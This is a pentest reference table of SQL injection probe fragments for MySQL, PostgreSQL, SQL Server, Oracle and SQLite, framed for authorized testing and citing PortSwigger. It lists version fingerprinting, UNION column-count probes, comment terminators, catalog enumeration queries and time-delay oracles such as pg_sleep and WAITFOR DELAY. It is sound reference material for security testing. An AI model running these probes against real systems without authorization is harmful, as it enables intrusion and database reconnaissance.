# DBMS Syntax and Safe-Probe Lookup

Examples are query fragments for an already-confirmed, authorized injection context. Adapt quoting, parentheses, column count, comment termination, and expression placement to the observed query. Test harmless constants before metadata. Do not use these entries to retrieve credentials, bulk data, files, or operating-system output.

## MySQL

| Syntax/probe | Context and precondition | Expected observable | Test purpose |
|---|---|---|---|
| `SELECT @@version` | A visible text-compatible `SELECT` position is established. | Version string normally identifies MySQL/MariaDB. | Corroborate DBMS family. |
| `UNION SELECT NULL,...` | Union context suspected; number of output columns unknown. | Success only when count/type compatibility is met. | Determine column count safely. |
| `CONCAT('a','b')` | Text expression position is available. | `ab` or a type/syntax difference. | Check concatenation syntax. |
| `-- ` or `#` | Need to neutralize known trailing query text. | Original trailing syntax no longer affects parse. | Validate comment rule; MySQL double dash requires whitespace. |
| `SELECT table_name FROM information_schema.tables` | Catalog access and a safe display/oracle are authorized. | A bounded metadata result or permission failure. | Establish catalog reachability. |

## PostgreSQL

| Syntax/probe | Context and precondition | Expected observable | Test purpose |
|---|---|---|---|
| `SELECT version()` | Visible text-compatible result channel. | PostgreSQL-formatted version text. | Corroborate DBMS family. |
| `'a'||'b'` | Text expression context. | `ab` or controlled syntax/type outcome. | Check concatenation behavior. |
| `SELECT table_name FROM information_schema.tables` | Authorized metadata scope. | Bounded metadata or privilege-limited response. | Establish standard catalog reachability. |
| `SELECT pg_sleep(n)` | Only after timing methodology and a valid expression context are proven. | Conditional, repeatable delay. | Validate timing oracle with minimal delay. |
| `--` or `/*...*/` | Known trailing syntax needs controlled termination. | Repeatable parse difference. | Check comment behavior. |

## SQL Server

| Syntax/probe | Context and precondition | Expected observable | Test purpose |
|---|---|---|
| `SELECT @@VERSION` | Visible compatible result column. | Microsoft SQL Server version banner. | Corroborate DBMS family. |
| `'a'+'b'` | Text expression context. | `ab` when operands are strings. | Check concatenation syntax. |
| `SELECT table_name FROM information_schema.tables` | Authorized metadata scope. | Bounded metadata or permissions error. | Establish catalog reachability. |
| `WAITFOR DELAY '0:0:n'` | Valid statement context and stable timing baseline. | Repeatable delay when executed. | Validate timing oracle at low delay. |
| `--` or `/*...*/` | Query tail is known. | Controlled parse change. | Check comment behavior. |

## Oracle

| Syntax/probe | Context and precondition | Expected observable | Test purpose |
|---|---|---|
| `SELECT banner FROM v$version` | Visible result channel; account may lack access. | Oracle version text or permission error. | Candidate DBMS corroboration. |
| `SELECT NULL FROM dual` | Constant `SELECT` used in union/type testing. | Valid constant query where `dual` is accepted. | Satisfy Oracle `FROM` requirement. |
| `'a'||'b'` | Text expression context. | `ab` or controlled type outcome. | Check concatenation syntax. |
| `SELECT table_name FROM all_tables` | Authorized catalog inquiry. | Bounded accessible-table metadata. | Establish reachable object scope. |
| `--` | Known query tail needs comment termination. | Repeatable parse change. | Check comment behavior. |

## SQLite

| Syntax/probe | Context and precondition | Expected observable | Test purpose |
|---|---|---|
| `SELECT sqlite_version()` | Visible compatible result channel. | SQLite version string. | Candidate DBMS corroboration. |
| `'a'||'b'` | Text expression context. | `ab`. | Check concatenation syntax. |
| `SELECT name FROM sqlite_master` | Authorized metadata scope. | Object names or an access/context failure. | Establish schema catalog behavior. |
| `PRAGMA table_info(name)` | Specific in-scope table is already known. | Column metadata, if query context allows pragma. | Verify one table's structure. |
| `--` or `/*...*/` | Known trailing query text. | Controlled parse difference. | Check comment behavior. |

## Sources

- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://portswigger.net/web-security/sql-injection/examining-the-database
- https://portswigger.net/web-security/sql-injection/union-attacks
